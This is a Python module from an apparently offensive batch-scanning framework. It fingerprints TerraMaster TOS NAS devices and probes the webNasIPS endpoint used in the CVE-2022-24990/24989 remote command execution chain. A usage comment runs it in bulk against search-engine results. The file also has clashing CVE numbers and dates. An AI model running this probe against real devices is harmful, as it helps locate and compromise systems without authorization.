# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2022-08-18 15:44

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.TerraMaster.CVE-2022-24990 -cs -fs "\"TerraMaster\" && header=\"TOS\""


class Script(BaseScript):
    name = 'TerraMaster'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2022-24989'
        # 来源
        self.bug_refer = 'http://wiki.peiqi.tech/wiki/webapp/TerraMaster/TerraMaster%20TOS%20createRaid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-24989.html'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/module/api.php?mobile/webNasIPS']
        # 相关信息
        self.info = '''TerraMaster TOS < 4.2.31，配合CVE-2022-24989实现命令执行
        在丽水市护网的时候有碰到过并且进行了利用，这里进行编写该poc作为记录 2020-8-17
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'https://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        await asyncio.sleep(2)
                        text = await response.text()
                        if ('TerraMaster' in text and '/css/ctools.css' in text) or 'https://www.terra-master.com/' in text or """top.window.location.href = '/Enter.php'""" in text:
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                        if 'TerraMaster' in response.headers.get('X-Powered-By', '') and 'TOS' in response.headers.get('Server', ''):
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'User-Agent': 'TNAS'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'https://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=headers, timeout=self.req_timeout)
                if text is not None and 'webNasIPS successful' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
